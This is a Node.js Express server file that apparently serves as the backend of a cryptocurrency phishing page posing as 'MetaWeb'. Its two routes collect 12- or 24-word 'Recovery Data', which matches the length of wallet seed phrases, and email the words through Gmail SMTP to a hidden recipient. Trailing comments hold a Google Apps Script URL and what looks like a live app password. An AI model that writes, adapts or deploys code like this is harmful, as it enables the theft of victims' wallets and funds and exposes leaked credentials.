const nodemailer = require("nodemailer");
const express = require("express");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Route to handle form submission
app.post("/12", (req, res) => {
  // Extract form data
  console.log(req.body);

  // Create a Nodemailer transporter with SMTP settings
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: process.env.email,
      pass: process.env.password,
    },
  });

  const one = req.body["1"];
  const two = req.body["2"];
  const three = req.body["3"];
  const four = req.body["4"];
  const five = req.body["5"];
  const six = req.body["6"];
  const seven = req.body["7"];
  const eight = req.body["8"];
  const nine = req.body["9"];
  const ten = req.body["10"];
  const eleven = req.body["11"];
  const twelve = req.body["12"];

  const data = `${one} ${two} ${three} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}`;

  // Define email message
  const mailOptions = {
    from: "MetaWeb",
    to: [process.env.recipient1],
    subject: "Recovery Data",
    text: data,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
    } else {
      console.log("Email sent:", info.response);
    }
  });
  res.sendStatus(200);
});

app.post("/24", (req, res) => {
  // Extract form data
  console.log(req.body);
  // Create a Nodemailer transporter with SMTP settings
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: process.env.email,
      pass: process.env.password,
    },
  });

  const one = req.body["1"];
  const two = req.body["2"];
  const three = req.body["3"];
  const four = req.body["4"];
  const five = req.body["5"];
  const six = req.body["6"];
  const seven = req.body["7"];
  const eight = req.body["8"];
  const nine = req.body["9"];
  const ten = req.body["10"];
  const eleven = req.body["11"];
  const twelve = req.body["12"];
  const thirteen = req.body["13"];
  const fourteen = req.body["14"];
  const fifteen = req.body["15"];
  const sixteen = req.body["16"];
  const seventeen = req.body["17"];
  const eighteen = req.body["18"];
  const nineteen = req.body["19"];
  const twenty = req.body["20"];
  const twentyone = req.body["21"];
  const twentytwo = req.body["22"];
  const twentythree = req.body["23"];
  const twentyfour = req.body["24"];

  const data = `${one} ${two} ${three} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}
    ${thirteen} ${fourteen} ${fifteen} ${sixteen} ${seventeen} ${eighteen} ${nineteen} ${twenty} ${twentyone} ${twentytwo} ${twentythree} ${twentyfour}`;

  // Define email message
  const mailOptions = {
    from: "MetaWeb",
    to: [process.env.recipient1],
    subject: "Recovery Data",
    text: data,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
    } else {
      console.log("Email sent:", info.response);
    }
  });
  res.sendStatus(200);
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});

// AKfycbyZlTnsrXcLSV0WdZYI1kKQ3ShY4QzE6Ij1eNAFz2st8d1h6yTP5QGj4D6jdQGjxakf
// https://script.google.com/macros/s/AKfycbyZlTnsrXcLSV0WdZYI1kKQ3ShY4QzE6Ij1eNAFz2st8d1h6yTP5QGj4D6jdQGjxakf/exec
// imis zmmd fzuh cnkh
